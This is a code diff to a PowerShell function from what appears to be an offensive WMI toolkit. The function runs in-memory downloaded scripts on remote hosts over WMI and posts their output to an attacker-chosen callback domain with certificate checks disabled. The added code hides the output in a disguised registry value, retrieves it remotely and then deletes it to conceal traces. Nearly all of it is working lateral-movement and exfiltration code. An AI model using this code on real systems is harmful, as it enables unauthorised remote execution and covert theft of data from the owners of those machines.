@@ -760,10 +760,10 @@ function Invoke-RemoteScriptWithOutput
     This function will use wmi to invoke powershell, download a powershell script in memory, and post its output back to a system you specify.  You will want to use the included https server (python).
 
     .PARAMETER User
-    Specify a username. Default is the current user context.
+    Specify a username. Default is the current user context.  This is for connecting to the remote machine over WMI.
 
     .PARAMETER Pass
-    Specify the password for the appropriate user.
+    Specify the password for the appropriate user.  This is for connecting to the remove machine over WMI.
 
     .PARAMETER TARGETS
     Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.
@@ -776,6 +776,12 @@ function Invoke-RemoteScriptWithOutput
 
     .PARAMETER CallbackSite
     The IP or domain to post the results back to.
+
+    .PARAMETER LocalUser
+    Optional parameter.  Local user for the system you are on.  Used to return output over WMI
+
+    .PARAMETER LocalPass
+    Parameter required if used with LocalUser.  Used to return output over WMI
 
     .EXAMPLE
     > Invoke-RemoteScriptWithOutput -User Chris -Pass password -Targets win7workstation -Url https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1 -Function Invoke-ExecCommandWMI -CallbackSite www.callbackdomain.com
@@ -800,7 +806,11 @@ function Invoke-RemoteScriptWithOutput
         [Parameter(Mandatory = $False)] 
         [string]$Function,
         [Parameter(Mandatory = $False)] 
-        [string]$CallbackSite
+        [string]$CallbackSite,
+        [Parameter(Mandatory = $False)] 
+        [string]$LocalUser,
+        [Parameter(Mandatory = $False)] 
+        [string]$LocalPass
     )
 
     Process
@@ -820,15 +830,46 @@ function Invoke-RemoteScriptWithOutput
                 $Command += "'$Url'"
                 $Command += ')); $output = '
                 $Command += "$Function;"
-                $Command += '$postback = '
-                $Command += "'https://$CallbackSite/testpost.php';"
-                $Command += '$uri = New-Object -TypeName System.Uri -ArgumentList $postback; $finaloutput = Out-String -InputObject $output; [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $wcc = New-Object -TypeName System.Net.WebClient; $wcc.UploadString($uri, $finaloutput)'
+
+                if($LocalUser -and $LocalPass)
+                {
+                    # setting variables for registry storage
+                    $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
+                    $registrydownname = "TrustedKey"
+                    # The reghive value is for hkey_local_machine
+                    $reghive = 2147483650
+                    $regpath = "SOFTWARE\Microsoft\DRM"
+                    $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+                    $Command += '$fctenc = [System.Convert]::ToBase64String($output); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+                }
+
+                else 
+                {
+                    $Command += '$postback = '
+                    $Command += "'https://$CallbackSite/testpost.php';"
+                    $Command += '$uri = New-Object -TypeName System.Uri -ArgumentList $postback; $finaloutput = Out-String -InputObject $output; [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $wcc = New-Object -TypeName System.Net.WebClient; $wcc.UploadString($uri, $finaloutput)'
+                }
 
                 Write-Verbose "Running command on remote system..."
+                Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $cred -Computername $computer
 
-                Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $cred -Computername $Targets
+                if($LocalUser -and $LocalPass)
+                {
+                    # Grab file from remote system's registry
+                    Write-Verbose "Sleeping, and then reading file from remote registry"
+                    Start-Sleep -s 15
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred
+                    $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
+                    # Print to console
+                    $enc = [System.Text.Encoding]::ASCII
+                    $enc.GetString($decode)
 
-                Write-Verbose "Command running!"
+                    # Removing Registry value from remote system
+                    Write-Verbose "Removing registry value from remote system"
+                    Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred
+
+                    Write-Verbose "Done!"
+                }
             }
         }
     }
